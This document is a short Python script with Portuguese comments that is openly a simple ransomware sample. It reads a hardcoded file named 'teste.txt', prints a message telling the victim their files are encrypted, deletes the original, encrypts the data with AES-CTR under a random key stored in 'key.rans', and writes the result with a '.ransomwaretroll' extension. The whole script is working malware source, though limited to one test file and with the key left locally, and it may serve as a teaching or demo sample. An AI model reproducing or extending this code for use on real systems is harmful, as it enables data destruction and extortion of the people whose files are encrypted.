import os
import pyaes
import base64
import random
import string

# Função para gerar uma chave aleatória com base64
def generate_random_key(length):
    characters = string.ascii_letters + string.digits
    random_key = ''.join(random.choice(characters) for _ in range(length))
    return random_key

# Abrir o arquivo a ser criptografado
file_name = 'teste.txt'
file = open(file_name, 'rb')
file_data = file.read()
file.close()

# Exibir mensagem de ataque
print("Seus arquivos foram criptografados. Para descriptografá-los, insira a chave.")

#Remover o arquivo original
os.remove(file_name)

# Gerar uma chave aleatória
key = generate_random_key(32)  # Tamanho da chave em bytes (no exemplo, 32 bytes)
aes = pyaes.AESModeOfOperationCTR(key.encode())

# Salvar a chave de criptografia em um arquivo
with open('key.rans', 'w') as key_file:
    key_file.write(key)

# Criptografar o arquivo
crypto_data = aes.encrypt(file_data)

# Salvar o arquivo criptografado
new_file = file_name + '.ransomwaretroll'
new_file = open(f'{new_file}','wb')
new_file.write(crypto_data)
new_file.close()
